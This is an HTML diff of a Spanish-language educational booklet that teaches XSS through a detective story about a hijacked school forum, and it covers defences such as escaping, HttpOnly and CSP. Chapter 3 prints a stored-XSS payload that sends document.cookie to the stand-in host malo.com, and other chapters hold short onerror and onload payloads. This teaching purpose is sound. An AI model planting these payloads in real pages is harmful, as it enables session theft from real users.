+  <div class="kicker" style="color:#B87400">Expediente 01 · Confidencial</div>
+  <h2 style="font-size:26pt;margin:6px 0 10px">El ataque a ForoClase</h2>
+  <div class="stamp" style="right:0.75in;top:0.7in;font-size:11pt">CASO ABIERTO</div>
+  <p><b>Lunes, 7:42 a. m.</b> ForoClase, la plataforma donde el colegio publica tareas, amaneció en caos: <b>37 estudiantes</b> descubrieron que sus cuentas habían publicado mensajes que nunca escribieron.</p>
+  <p>Una de ellas es Ana, que solo entró a leer los comentarios de la Tarea 3. Dani, el desarrollador, revisó todo: <b>ninguna contraseña fue filtrada</b>. El único rastro es un usuario recién creado llamado <code style="color:var(--red)">n0cturno</code>.</p>
+  <p><b>Tu misión:</b> reunir las <b>5 evidencias</b> escondidas al final de cada capítulo, descifrar el mensaje oculto de la página <span data-pg="oculto"></span> y cerrar el caso.</p>
+
+  <h3>Personas involucradas</h3>
+  <div class="cols" style="gap:10px">
+    <div class="card who"><div class="face"><svg class="av"><use href="#ana"/></svg></div><div><b>Ana</b><span>Víctima. Estudiante. Abrió el foro y su cuenta empezó a publicar sola.</span></div></div>
+    <div class="card who"><div class="face"><svg class="av"><use href="#dani"/></svg></div><div><b>Dani</b><span>Desarrollador de ForoClase. Programó la sección de comentarios.</span></div></div>
+    <div class="card who"><div class="face" style="background:#F1F5F9"><svg class="av"><use href="#nocturno"/></svg></div><div><b>n0cturno</b><span>Sospechoso. Cuenta creada el domingo a las 2:05 a. m.</span></div></div>
+    <div class="card who"><div class="face" style="background:#F1F5F9"><svg class="av"><use href="#servidor"/></svg></div><div><b>ForoClase</b><span>Escena del ataque. Guarda tareas, comentarios y sesiones.</span></div></div>
+  </div>
+
+  <h3>Registro de evidencias</h3>
+  <table style="font-size:9pt" class="evlog">
+    <tr><th style="width:12%">Ev.</th><th style="width:20%">Dónde</th><th>¿Qué descubriste?</th></tr>
+    <tr><td><b>A</b></td><td>Capítulo 1</td><td></td></tr>
+    <tr><td><b>B</b></td><td>Capítulo 2</td><td></td></tr>
+    <tr><td><b>C</b></td><td>Capítulo 3</td><td></td></tr>
+    <tr><td><b>D</b></td><td>Capítulo 4</td><td></td></tr>
+    <tr><td><b>E</b></td><td>Capítulo 5</td><td></td></tr>
+  </table>
+  <div class="folio"><span>XSS ACADEMY · Expediente 01</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 1 APERTURA ============ -->
+<section class="page opener" id="cap1">
+  <div class="grid-bg"></div>
+  <div class="inner">
+    <div class="kicker" style="color:var(--turq)">Capítulo</div>
+    <div class="num">01</div>
+    <h2>¿Qué es XSS?</h2>
+    <p class="lead">XSS significa <b style="color:var(--turq)">Cross-Site Scripting</b> (secuencias de comandos en sitios cruzados). Es una vulnerabilidad que permite a un atacante <b>insertar código JavaScript</b> en una página web que otras personas visitan.</p>
+    <p class="lead">El navegador de la víctima no sabe que ese código es malicioso: lo ejecuta como si viniera del propio sitio, con sus mismos permisos.</p>
+  </div>
+  <svg style="position:absolute;left:0.75in;bottom:1.0in" width="7in" height="3.3in" viewBox="0 0 670 316">
+    <g font-family="Inter" font-size="13">
+      <use href="#ana" x="0" y="0" width="80" height="80"/>
+      <rect x="0" y="86" width="180" height="180" rx="14" fill="#F0FDFA" stroke="#0FA89C" stroke-width="2"/>
+      <text x="90" y="118" text-anchor="middle" fill="#0F766E" font-family="Space Grotesk" font-size="16" font-weight="700">DATOS</text>
+      <text x="90" y="140" text-anchor="middle" fill="#475569">lo que escribe el usuario</text>
+      <rect x="20" y="160" width="140" height="80" rx="8" fill="#FFFFFF" stroke="#99F6E4" stroke-width="1.5"/>
+      <text x="90" y="194" text-anchor="middle" fill="#0B1B33" font-family="JetBrains Mono" font-size="12">"¡Hola!"</text>
+      <text x="90" y="218" text-anchor="middle" fill="#16A34A" font-family="JetBrains Mono" font-size="11" font-weight="700">✓ texto</text>
+
+      <use href="#nocturno" x="590" y="0" width="80" height="80"/>
+      <rect x="490" y="86" width="180" height="180" rx="14" fill="#FFF1F2" stroke="#E11D48" stroke-width="2"/>
+      <text x="580" y="118" text-anchor="middle" fill="#BE123C" font-family="Space Grotesk" font-size="16" font-weight="700">CÓDIGO</text>
+      <text x="580" y="140" text-anchor="middle" fill="#475569">lo que el navegador ejecuta</text>
+      <rect x="510" y="160" width="140" height="80" rx="8" fill="#FFFFFF" stroke="#FECDD3" stroke-width="1.5"/>
+      <text x="580" y="194" text-anchor="middle" fill="#0B1B33" font-family="JetBrains Mono" font-size="11">&lt;script&gt;…</text>
+      <text x="580" y="218" text-anchor="middle" fill="#BE123C" font-family="JetBrains Mono" font-size="11" font-weight="700">⚠ se ejecuta</text>
+
+      <path d="M190 180 C 290 90, 380 90, 480 180" fill="none" stroke="#D97706" stroke-width="2.5" stroke-dasharray="8 6"/>
+      <polygon points="480,180 466,168 462,184" fill="#D97706"/>
+      <text x="335" y="98" text-anchor="middle" fill="#B45309" font-family="Space Grotesk" font-size="15" font-weight="700">XSS = la frontera se rompe</text>
+      <text x="335" y="300" text-anchor="middle" fill="#334155" font-size="12">Un sitio vulnerable deja que los datos crucen al lado del código.</text>
+    </g>
+  </svg>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 1</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 1 CONTENIDO ============ -->
+<section class="page">
+  <div class="chapter-band"></div>
+  <div class="kicker">Capítulo 1 · ¿Qué es XSS?</div>
+  <h2 style="font-size:22pt;margin:6px 0 10px">Datos que se disfrazan de código</h2>
+  <p>Las páginas web mezclan <b>HTML</b>, que define el contenido, y <b>JavaScript</b>, que le da comportamiento. Cuando un sitio muestra algo escrito por un usuario —un comentario, un nombre, una búsqueda— debe tratarlo siempre como <b>texto</b>.</p>
+  <p>El problema aparece cuando el sitio pega ese texto directamente dentro del HTML. Si el usuario escribió etiquetas como <code>&lt;script&gt;</code>, el navegador las interpreta y ejecuta su contenido.</p>
+
+  <h3>Ejemplo: el muro de comentarios</h3>
+  <div class="cols">
+    <div>
+      <p style="margin-bottom:4px"><b>Ana</b> escribe:</p>
+      <pre class="code">¡Excelente explicación, profe!</pre>
+      <div class="card" style="padding:7px 12px">La página muestra: ¡Excelente explicación, profe!</div>
+    </div>
+    <div>
+      <p style="margin-bottom:4px"><b>n0cturno</b> escribe:</p>
+      <pre class="code"><span class="t">&lt;script&gt;</span>alert(<span class="s">'Hackeado'</span>)<span class="t">&lt;/script&gt;</span></pre>
+      <div class="card" style="padding:7px 12px;border-color:var(--red);background:#FFF0F2">⚠ Aparece una ventana a <b>cada persona</b> que abre la página.</div>
+    </div>
+  </div>
+  <p style="margin-top:10px">Una ventana con un mensaje parece inofensiva, pero demuestra que el atacante puede ejecutar <b>cualquier</b> código en el navegador de la víctima: leer información, cambiar la página o enviar datos a otro servidor.</p>
+
+  <div class="cols3">
+    <div class="card"><h3 style="margin-top:0"><svg class="ic"><use href="#i-cookie"/></svg>Cookies</h3><p style="margin:0;font-size:9.2pt">Guardan la sesión iniciada. Si se roban, el atacante entra como la víctima.</p></div>
+    <div class="card"><h3 style="margin-top:0"><svg class="ic"><use href="#i-lock"/></svg>Same-Origin</h3><p style="margin:0;font-size:9.2pt">El código de un sitio solo accede a sus datos. XSS la esquiva porque el código «parece» del sitio.</p></div>
+    <div class="card"><h3 style="margin-top:0"><svg class="ic"><use href="#i-clip"/></svg>OWASP</h3><p style="margin:0;font-size:9.2pt">Publica los riesgos web más críticos. XSS está dentro de «Inyección» (A03:2021).</p></div>
+  </div>
+
+  <div class="bottom">
+    <div class="pista"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA A</div><p>Captura del foro: el comentario de <b>n0cturno</b> se ve vacío, pero el código fuente de la página muestra un <code>&lt;script&gt;</code>. El foro trató un dato como código.</p><span class="note">Anótala en tu expediente.</span></div>
+    <div class="qrbox"><div class="qr" data-qr="#cap1"></div><div><b>Escanea para ver cómo funciona</b><span style="font-size:8.6pt;color:#475569">Escribe un texto y mira cómo lo interpreta el navegador.</span><br><small data-qr-url="#cap1"></small></div></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 1</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 2 APERTURA ============ -->
+<section class="page opener" id="cap2">
+  <div class="grid-bg"></div>
+  <div class="inner">
+    <div class="kicker" style="color:var(--turq)">Capítulo</div>
+    <div class="num">02</div>
+    <h2>Tipos de XSS</h2>
+    <p class="lead">No todos los ataques XSS llegan por el mismo camino. Según <b style="color:var(--turq)">dónde se guarda</b> y <b style="color:var(--turq)">quién procesa</b> el código malicioso, se clasifican en tres familias.</p>
+  </div>
+  <div style="position:absolute;left:0.75in;right:0.75in;bottom:1.1in;display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;z-index:2">
+    <div class="card dark" style="background:#FFFDF5 !important;border:2px solid var(--amber) !important"><svg class="ic lg" style="color:var(--amber)"><use href="#i-loop"/></svg><h3 style="color:#B45309 !important">Reflejado</h3><p style="margin:0;color:#334155">El código viaja en un enlace y el servidor lo «refleja» de vuelta en la respuesta.</p></div>
+    <div class="card dark" style="background:#FFF5F5 !important;border:2px solid var(--red) !important"><svg class="ic lg" style="color:var(--red)"><use href="#i-db"/></svg><h3 style="color:#BE123C !important">Almacenado</h3><p style="margin:0;color:#334155">El código se guarda en la base de datos y ataca a todos los que visitan la página.</p></div>
+    <div class="card dark" style="background:#F0FDFA !important;border:2px solid var(--turq2) !important"><svg class="ic lg" style="color:var(--turq2)"><use href="#i-code"/></svg><h3 style="color:#0F766E !important">Basado en DOM</h3><p style="margin:0;color:#334155">El JavaScript del propio sitio inserta el dato en la página, sin pasar por el servidor.</p></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 2</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 2 CONTENIDO ============ -->
+<section class="page">
+  <div class="chapter-band"></div>
+  <div class="kicker">Capítulo 2 · Tipos de XSS</div>
+  <h2 style="font-size:22pt;margin:6px 0 12px">Cuadro comparativo</h2>
+  <table>
+    <tr><th style="width:19%"></th><th>Reflejado</th><th>Almacenado</th><th>DOM</th></tr>
+    <tr><td><b>¿Dónde vive el código?</b></td><td>En la URL o en un formulario enviado</td><td>En la base de datos del sitio</td><td>En el navegador (URL, <code>#fragmento</code>, almacenamiento local)</td></tr>
+    <tr><td><b>¿Quién lo inserta?</b></td><td>El servidor, al responder</td><td>El servidor, al mostrar datos guardados</td><td>El JavaScript del propio sitio</td></tr>
+    <tr><td><b>¿Cómo llega a la víctima?</b></td><td>Debe abrir un enlace trampa</td><td>Solo con visitar la página</td><td>Abriendo un enlace o con datos manipulados</td></tr>
+    <tr><td><b>Alcance</b></td><td>Una víctima por clic</td><td>Todas las visitas: <b>el más peligroso</b></td><td>Variable</td></tr>
+  </table>
+
+  <h3 style="margin-top:14px">Así se ve cada uno</h3>
+  <div class="cols3">
+    <div>
+      <span class="pill">REFLEJADO</span>
+      <pre class="code" style="font-size:7.8pt">tienda.com/buscar?q=
+<span class="t">&lt;script&gt;</span>robar()<span class="t">&lt;/script&gt;</span></pre>
+      <p style="font-size:9.2pt">Se envía por correo o redes. Quien lo abre ejecuta el script.</p>
+    </div>
+    <div>
+      <span class="pill">ALMACENADO</span>
+      <pre class="code" style="font-size:7.8pt">Comentario guardado:
+"Buen producto
+<span class="t">&lt;img src=x onerror=</span>robar()<span class="t">&gt;</span>"</pre>
+      <p style="font-size:9.2pt">Cada visitante que lee los comentarios ejecuta el código.</p>
+    </div>
+    <div>
+      <span class="pill">DOM</span>
+      <pre class="code" style="font-size:7.8pt"><span class="c">// código del sitio</span>
+saludo.<span class="k">innerHTML</span> =
+  location.hash;</pre>
+      <p style="font-size:9.2pt">El script toma lo que va después de <code>#</code> y lo pega como HTML.</p>
+    </div>
+  </div>
+  <div class="callout" style="margin-top:2px"><b>Truco para recordar:</b> Reflejado = <i>rebota</i> · Almacenado = <i>se queda</i> · DOM = <i>lo hace el propio navegador</i>.</div>
+
+  <div class="bottom">
+    <div class="pista"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA B</div><p>Las 37 víctimas solo abrieron la página de la <b>Tarea 3</b>. Ninguna hizo clic en un enlace extraño. ¿Qué tipo de XSS deja el código guardado esperando?</p><span class="note">Anótala en tu expediente.</span></div>
+    <div class="qrbox"><div class="qr" data-qr="#cap2"></div><div><b>Escanea para ver los ejemplos animados</b><span style="font-size:8.6pt;color:#475569">Mira cómo viaja el código en cada tipo.</span><br><small data-qr-url="#cap2"></small></div></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 2</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 3 APERTURA ============ -->
+<section class="page opener" id="cap3">
+  <div class="grid-bg"></div>
+  <div class="inner">
+    <div class="kicker" style="color:var(--turq)">Capítulo</div>
+    <div class="num">03</div>
+    <h2>¿Cómo ocurre?</h2>
+    <p class="lead">Reconstruyamos lo que pasó en ForoClase. Cinco pasos separan un comentario inocente del robo de 37 sesiones. Primero, en viñetas; después, con lupa.</p>
+  </div>
+  <svg style="position:absolute;left:0.75in;bottom:0.95in" width="7in" height="3.7in" viewBox="0 0 700 370">
+    <g font-family="Inter" font-size="12.5">
+      <use href="#nocturno" x="10" y="20" width="110" height="110"/>
+      <text x="65" y="148" text-anchor="middle" fill="#BE123C" font-weight="700">n0cturno</text>
+      <use href="#servidor" x="295" y="20" width="110" height="110"/>
+      <text x="350" y="148" text-anchor="middle" fill="#0F766E" font-weight="700">ForoClase</text>
+      <use href="#ana" x="580" y="20" width="110" height="110"/>
+      <text x="635" y="148" text-anchor="middle" fill="#15803D" font-weight="700">Ana</text>
+      <rect x="290" y="250" width="120" height="80" rx="10" fill="#FFF1F2" stroke="#E11D48" stroke-width="2"/>
+      <text x="350" y="285" text-anchor="middle" fill="#BE123C" font-family="JetBrains Mono" font-weight="700">malo.com</text>
+      <text x="350" y="308" text-anchor="middle" fill="#475569" font-size="11">servidor del atacante</text>
+      <path d="M120 75 L285 75" stroke="#D97706" stroke-width="2.5" marker-end="url(#ar)"/>
+      <text x="200" y="62" text-anchor="middle" fill="#B45309" font-weight="600">① publica comentario</text>
+      <path d="M410 75 L570 75" stroke="#D97706" stroke-width="2.5" marker-end="url(#ar)"/>
+      <text x="490" y="62" text-anchor="middle" fill="#B45309" font-weight="600">③ entrega la página</text>
+      <text x="350" y="172" text-anchor="middle" fill="#1E293B" font-weight="600">② lo guarda sin revisar</text>
+      <path d="M635 160 C 635 260, 520 290, 420 290" fill="none" stroke="#E11D48" stroke-width="2.5" stroke-dasharray="7 5" marker-end="url(#ar2)"/>
+      <text x="600" y="240" text-anchor="middle" fill="#BE123C" font-weight="600">④ el script envía</text><text x="600" y="256" text-anchor="middle" fill="#BE123C" font-weight="600">la cookie</text>
+      <path d="M290 290 C 160 290, 65 250, 65 160" fill="none" stroke="#E11D48" stroke-width="2.5" marker-end="url(#ar2)"/>
+      <text x="120" y="262" text-anchor="middle" fill="#BE123C" font-weight="600">⑤ usa la sesión</text>
+      <defs>
+        <marker id="ar" markerWidth="10" markerHeight="10" refX="8" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#D97706"/></marker>
+        <marker id="ar2" markerWidth="10" markerHeight="10" refX="8" refY="5" orient="auto"><path d="M0,0 L10,5 L0,10 z" fill="#E11D48"/></marker>
+      </defs>
+    </g>
+  </svg>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 3</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 3 CÓMIC ============ -->
+<section class="page" style="padding-top:0.5in">
+  <div class="chapter-band"></div>
+  <div style="display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:10px">
+    <div><div class="kicker">Capítulo 3 · En viñetas</div><h2 style="font-size:20pt;margin-top:4px">La noche del ataque</h2></div>
+    <span class="pill">Reconstrucción del caso</span>
+  </div>
+  <div class="comic" id="comic"></div>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 3</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 3 PASOS ============ -->
+<section class="page">
+  <div class="chapter-band"></div>
+  <div class="kicker">Capítulo 3 · ¿Cómo ocurre?</div>
+  <h2 style="font-size:22pt;margin:6px 0 12px">El ataque, con lupa</h2>
+
+  <div class="step"><div class="n">1</div><div><b>Reconocimiento.</b> n0cturno prueba el formulario con algo inofensivo: <code>&lt;b&gt;hola&lt;/b&gt;</code>. Si sale en <b>negrita</b>, el sitio interpreta HTML: hay una puerta abierta.</div></div>
+  <div class="step"><div class="n">2</div><div><b>Inyección.</b> Publica un comentario con código oculto:
+    <pre class="code" style="margin-top:6px">¡Gran tarea! <span class="t">&lt;script&gt;</span>
+  <span class="k">new</span> Image().src = <span class="s">"https://malo.com/?c="</span> + document.cookie;
+<span class="t">&lt;/script&gt;</span></pre></div></div>
+  <div class="step"><div class="n">3</div><div><b>Almacenamiento.</b> ForoClase guarda el comentario tal cual. En pantalla solo se ve «¡Gran tarea!».</div></div>
+  <div class="step"><div class="n">4</div><div><b>Ejecución.</b> Ana abre el foro. Su navegador encuentra el <code>&lt;script&gt;</code> y lo ejecuta: pide una «imagen» a <code>malo.com</code> con la cookie de sesión escondida en la dirección.</div></div>
+  <div class="step"><div class="n">5</div><div><b>Explotación.</b> n0cturno copia esa cookie y entra al foro <b>como Ana</b>, sin conocer su contraseña.</div></div>
+
+  <div class="cols" style="margin-top:4px">
+    <div class="card"><h3 style="margin-top:0"><svg class="ic"><use href="#i-alert"/></svg>¿Dónde falló el sitio?</h3>
+      <ul class="tight" style="font-size:9.3pt;margin-bottom:0">
+        <li>No <b>escapó</b> el texto al mostrarlo.</li>
+        <li>La cookie no tenía la marca <code>HttpOnly</code>.</li>
+        <li>No usaba una política CSP.</li>
+      </ul></div>
+    <div class="card dark"><h3 style="margin-top:0">Otras «cargas» habituales</h3>
+      <p class="mono" style="font-size:8.2pt;margin:0;line-height:1.6">&lt;img src=x onerror=…&gt;<br>&lt;svg onload=…&gt;<br>&lt;a href="javascript:…"&gt;</p>
+      <p style="font-size:8.6pt;margin:4px 0 0;color:#475569">Bloquear solo la palabra «script» no sirve.</p></div>
+  </div>
+
+  <div class="bottom">
+    <div class="pista"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA C</div><p>Registro del servidor: <b>37 peticiones</b> a <code>malo.com/?c=sesion=…</code>, cada una segundos después de que alguien abriera la Tarea 3. ¿Qué se llevó n0cturno?</p><span class="note">Anótala en tu expediente.</span></div>
+    <div class="qrbox"><div class="qr" data-qr="#cap3"></div><div><b>Escanea para usar el simulador seguro</b><span style="font-size:8.6pt;color:#475569">Ataca un ForoClase de práctica, en modo vulnerable y protegido.</span><br><small data-qr-url="#cap3"></small></div></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 3</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 4 APERTURA ============ -->
+<section class="page opener" id="cap4">
+  <div class="grid-bg"></div>
+  <div class="inner">
+    <div class="kicker" style="color:var(--turq)">Capítulo</div>
+    <div class="num">04</div>
+    <h2>Riesgos</h2>
+    <p class="lead">Un ataque XSS le da al atacante el mismo poder que tiene el sitio dentro del navegador de la víctima. Estas son las consecuencias más comunes.</p>
+  </div>
+  <div style="position:absolute;left:0.75in;right:0.75in;bottom:1.1in;display:grid;grid-template-columns:1fr 1fr;gap:12px;z-index:2">
+    <div class="card dark" style="background:#F8FAFC !important;border:1.5px solid #CBD5E1 !important"><h3><svg class="ic"><use href="#i-cookie"/></svg>Robo de sesión</h3><p style="margin:0;color:#334155">Suplantar a la víctima sin saber su contraseña.</p></div>
+    <div class="card dark" style="background:#F8FAFC !important;border:1.5px solid #CBD5E1 !important"><h3><svg class="ic"><use href="#i-hook"/></svg>Phishing interno</h3><p style="margin:0;color:#334155">Mostrar un formulario falso de inicio de sesión dentro del sitio real.</p></div>
+    <div class="card dark" style="background:#F8FAFC !important;border:1.5px solid #CBD5E1 !important"><h3><svg class="ic"><use href="#i-keyboard"/></svg>Captura de teclas</h3><p style="margin:0;color:#334155">Registrar lo que la víctima escribe en la página.</p></div>
+    <div class="card dark" style="background:#F8FAFC !important;border:1.5px solid #CBD5E1 !important"><h3><svg class="ic"><use href="#i-brush"/></svg>Desfiguración</h3><p style="margin:0;color:#334155">Cambiar textos, imágenes o enlaces para engañar o dañar la reputación.</p></div>
+    <div class="card dark" style="background:#F8FAFC !important;border:1.5px solid #CBD5E1 !important"><h3><svg class="ic"><use href="#i-cursor"/></svg>Acciones en tu nombre</h3><p style="margin:0;color:#334155">Publicar, comprar o cambiar datos como si fueras tú.</p></div>
+    <div class="card dark" style="background:#F8FAFC !important;border:1.5px solid #CBD5E1 !important"><h3><svg class="ic"><use href="#i-worm"/></svg>Gusanos</h3><p style="margin:0;color:#334155">Código que se copia solo de perfil en perfil.</p></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 4</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 4 CONTENIDO ============ -->
+<section class="page">
+  <div class="chapter-band"></div>
+  <div class="kicker">Capítulo 4 · Riesgos</div>
+  <h2 style="font-size:22pt;margin:6px 0 12px">Casos reales</h2>
+
+  <div class="card" style="margin-bottom:9px">
+    <span class="pill">2005 · MYSPACE</span>
+    <h3>El gusano Samy</h3>
+    <p style="margin:0">Un joven programador escondió código en su perfil de MySpace. Quien lo visitaba lo agregaba como amigo y copiaba el código en su propio perfil. En unas 20 horas superó el millón de afectados, y su autor terminó condenado a libertad condicional.</p>
+  </div>
+  <div class="card" style="margin-bottom:9px">
+    <span class="pill">2014 · TWEETDECK</span>
+    <h3>El tuit que se retuiteaba solo</h3>
+    <p style="margin:0">Una falla XSS en TweetDeck permitió crear un tuit con código que se retuiteaba automáticamente al ser visto. Se compartió decenas de miles de veces en minutos y el servicio se desactivó temporalmente.</p>
+  </div>
+  <div class="card" style="margin-bottom:9px">
+    <span class="pill">2019 · FORTNITE</span>
+    <h3>Una página olvidada</h3>
+    <p style="margin:0">Investigadores de Check Point hallaron un XSS en una página antigua de Epic Games que, combinado con otros errores, podía permitir tomar cuentas de jugadores. Lección: <b>las páginas viejas también cuentan</b>.</p>
+  </div>
+
+  <table>
+    <tr><th>Usuarios</th><th>Institución</th><th>Desarrolladores</th></tr>
+    <tr><td>Pérdida de cuentas, datos personales y dinero</td><td>Daño a la reputación, multas por protección de datos</td><td>Correcciones urgentes, auditorías y pérdida de confianza</td></tr>
+  </table>
+
+  <div class="bottom">
+    <div class="pista"><div class="lbl"><svg class="ic"><use href="#i-search"/></svg>EVIDENCIA D</div><p>Las cuentas robadas publicaron el mismo «¡Gran tarea!» en otros temas del foro, y así se sumaron más víctimas. ¿A cuál caso real se parece?</p><span class="note">Anótala en tu expediente.</span></div>
+    <div class="qrbox"><div class="qr" data-qr="#cap4"></div><div><b>Escanea para vivir la historia</b><span style="font-size:8.6pt;color:#475569">Decide como Dani y descubre las consecuencias.</span><br><small data-qr-url="#cap4"></small></div></div>
+  </div>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 4</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 5 APERTURA ============ -->
+<section class="page opener" id="cap5">
+  <div class="grid-bg"></div>
+  <div class="inner">
+    <div class="kicker" style="color:var(--turq)">Capítulo</div>
+    <div class="num">05</div>
+    <h2>Prevención</h2>
+    <p class="lead">La regla de oro: <b style="color:var(--turq)">nunca confíes en los datos del usuario</b> y trátalos siempre como texto. Ninguna defensa es perfecta sola; por eso se usan varias capas.</p>
+  </div>
+  <svg style="position:absolute;left:0.75in;bottom:1.0in" width="7in" height="3.6in" viewBox="0 0 700 360">
+    <use href="#dani" x="0" y="150" width="200" height="200"/>
+    <g font-family="Space Grotesk" font-weight="700" font-size="15" text-anchor="middle">
+      <rect x="180" y="0" width="500" height="62" rx="12" fill="#F0FDFA" stroke="#0D9488" stroke-width="1.8"/><text x="430" y="38" fill="#0F766E">1 · Validar la entrada</text>
+      <rect x="205" y="74" width="450" height="62" rx="12" fill="#F0FDFA" stroke="#0D9488" stroke-width="1.8"/><text x="430" y="112" fill="#0F766E">2 · Escapar la salida</text>
+      <rect x="230" y="148" width="400" height="62" rx="12" fill="#F0FDFA" stroke="#0D9488" stroke-width="1.8"/><text x="430" y="186" fill="#0F766E">3 · APIs seguras (textContent)</text>
+      <rect x="255" y="222" width="350" height="62" rx="12" fill="#F0FDFA" stroke="#0D9488" stroke-width="1.8"/><text x="430" y="260" fill="#0F766E">4 · Cookies HttpOnly</text>
+      <rect x="280" y="296" width="300" height="62" rx="12" fill="#CCFBF1" stroke="#0F766E" stroke-width="2"/><text x="430" y="334" fill="#115E59">5 · Política CSP</text>
+    </g>
+  </svg>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 5</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 5 A ============ -->
+<section class="page">
+  <div class="chapter-band"></div>
+  <div class="kicker">Capítulo 5 · Prevención</div>
+  <h2 style="font-size:22pt;margin:6px 0 10px">Código inseguro vs. código seguro</h2>
+
+  <h3>A. Mostrar un comentario con JavaScript</h3>
+  <div class="cols">
+    <pre class="code bad"><span class="tag">INSEGURO</span><span class="c">// interpreta el texto como HTML</span>
+caja.<span class="k">innerHTML</span> = comentario;</pre>
+    <pre class="code good"><span class="tag">SEGURO</span><span class="c">// lo muestra como texto plano</span>
+caja.<span class="k">textContent</span> = comentario;</pre>
+  </div>
+
+  <h3>B. Escapar caracteres especiales</h3>
+  <p style="font-size:9.8pt">«Escapar» es reemplazar los caracteres que tienen significado en HTML por su versión inofensiva, llamada <b>entidad</b>. Así <code>&lt;script&gt;</code> se ve en pantalla, pero no se ejecuta.</p>
+  <div class="cols">
+    <table style="font-size:9pt">
+      <tr><th>Carácter</th><th>Entidad</th></tr>
+      <tr><td><code>&lt;</code></td><td><code>&amp;lt;</code></td></tr>
+      <tr><td><code>&gt;</code></td><td><code>&amp;gt;</code></td></tr>
+      <tr><td><code>&amp;</code></td><td><code>&amp;amp;</code></td></tr>
+      <tr><td><code>"</code></td><td><code>&amp;quot;</code></td></tr>
+      <tr><td><code>'</code></td><td><code>&amp;#39;</code></td></tr>
+    </table>
+    <pre class="code good" style="margin:0"><span class="tag">SEGURO</span><span class="k">function</span> escapar(txt) {
+  <span class="k">return</span> txt
+    .replace(<span class="s">/&amp;/g</span>, <span class="s">"&amp;amp;"</span>)
+    .replace(<span class="s">/&lt;/g</span>, <span class="s">"&amp;lt;"</span>)
+    .replace(<span class="s">/&gt;/g</span>, <span class="s">"&amp;gt;"</span>)
+    .replace(<span class="s">/"/g</span>, <span class="s">"&amp;quot;"</span>)
+    .replace(<span class="s">/'/g</span>, <span class="s">"&amp;#39;"</span>);
+}</pre>
+  </div>
+  <p style="font-size:9.3pt;margin-top:8px">Fíjate en <code>&amp;#39;</code>: también existen entidades <b>numéricas</b>. <code>&amp;#</code> + un número representa cualquier letra; por ejemplo, <code>&amp;#65;</code> es la <b>A</b>. Lo necesitarás más adelante…</p>
+
+  <h3>C. En el servidor (PHP)</h3>
+  <div class="cols">
+    <pre class="code bad"><span class="tag">INSEGURO</span><span class="k">echo</span> <span class="s">"Hola "</span> . $_GET[<span class="s">'nombre'</span>];</pre>
+    <pre class="code good"><span class="tag">SEGURO</span><span class="k">echo</span> <span class="s">"Hola "</span> . htmlspecialchars(
+  $_GET[<span class="s">'nombre'</span>], ENT_QUOTES, <span class="s">'UTF-8'</span>);</pre>
+  </div>
+  <div class="callout"><b>Nota:</b> React, Angular o Vue escapan el texto automáticamente. El peligro vuelve con <code>dangerouslySetInnerHTML</code> o <code>v-html</code> usados con datos del usuario.</div>
+  <div class="folio"><span>XSS ACADEMY · Capítulo 5</span><span><b class="pg"></b></span></div>
+</section>
+
+<!-- ============ CAP 5 B ============ -->
+<section class="page">
+  <div class="chapter-band"></div>
+  <div class="kicker">Capítulo 5 · Prevención</div>
+  <h2 style="font-size:22pt;margin:6px 0 8px">Más capas de defensa</h2>
+
+  <h3>D. Cookies protegidas</h3>
+  <p style="font-size:9.6pt">La marca <code>HttpOnly</code> impide que JavaScript lea la cookie: aunque exista un XSS, <code>document.cookie</code> no la revela.</p>
+  <pre class="code good"><span class="tag">SEGURO</span>Set-Cookie: sesion=abc123; <span class="t">HttpOnly</span>; <span class="t">Secure</span>; <span class="t">SameSite=Lax</span></pre>
+
+  <h3>E. Content Security Policy (CSP)</h3>
+  <p style="font-size:9.6pt">Una cabecera que le dice al navegador desde dónde puede cargar scripts. Los scripts inyectados en la página quedan bloqueados.</p>
+  <pre class="code good"><span class="tag">SEGURO</span>Content-Security-Policy: script-src <span class="s">'self'</span>; object-src <span class="s">'none'</span></pre>
+
+  <h3>F. Si necesitas permitir algo de HTML</h3>
+  <p style="font-size:9.6pt">Por ejemplo, negritas en un editor: usa una librería de <b>sanitización</b> probada, como DOMPurify.</p>
+  <pre class="code good"><span class="tag">SEGURO</span>caja.innerHTML = DOMPurify.sanitize(comentario);</pre>
+
+  <h3 style="margin-top:10px"><svg class="ic"><use href="#i-shield"/></svg>Lista de verificación del desarrollador</h3>
+  <div class="cols" style="font-size:9.3pt">
+    <div><p><span class="box"></span>Uso <code>textContent</code>, no <code>innerHTML</code></p><p><span class="box"></span>Escapo toda salida con datos del usuario</p><p style="margin:0"><span class="box"></span>Valido tipo y formato de cada campo</p></div>
+    <div><p><span class="box"></span>Mis cookies de sesión son <code>HttpOnly</code></p><p><span class="box"></span>Tengo una cabecera CSP</p><p style="margin:0"><span class="box"></span>Reviso también páginas antiguas</p></div>
+  </div>
+
